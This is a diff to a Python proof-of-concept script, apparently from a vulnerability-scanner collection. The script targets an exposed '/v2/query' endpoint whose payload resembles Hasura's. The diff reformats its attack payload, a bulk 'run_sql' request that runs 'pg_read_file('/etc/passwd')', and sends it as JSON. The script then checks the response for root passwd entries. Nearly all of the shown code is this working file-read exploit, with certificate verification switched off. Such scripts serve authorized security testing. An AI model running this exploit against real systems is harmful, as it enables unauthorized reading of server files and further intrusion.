@@ -1,4 +1,5 @@
 import requests
+import re
 
 
 # Vuln Base Info
@@ -37,23 +38,23 @@ def poc(url):
 
         path = """/v2/query"""
         method = "POST"
-        data = """{
-  "type": "bulk",
-  "source": "default",
-  "args":[
-    {
-      "type": "run_sql",
-      "args": {
-        "source":"default",
-        "sql":"SELECT pg_read_file('/etc/passwd',0,100000);",
-        "cascade": false,
-        "read_only": false
-      }
-    }
-  ]
-}"""
+        data = {
+            "type": "bulk",
+            "source": "default",
+            "args":[
+                {
+                "type": "run_sql",
+                "args": {
+                    "source":"default",
+                    "sql":"SELECT pg_read_file('/etc/passwd',0,100000);",
+                    "cascade": False,
+                    "read_only": False
+                }
+                }
+            ]
+        }
         headers = {'Content-Type': 'application/json'}
-        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if (re.search(r"""root:.*:0:0:""",resp0.text)):
             result["success"] = True
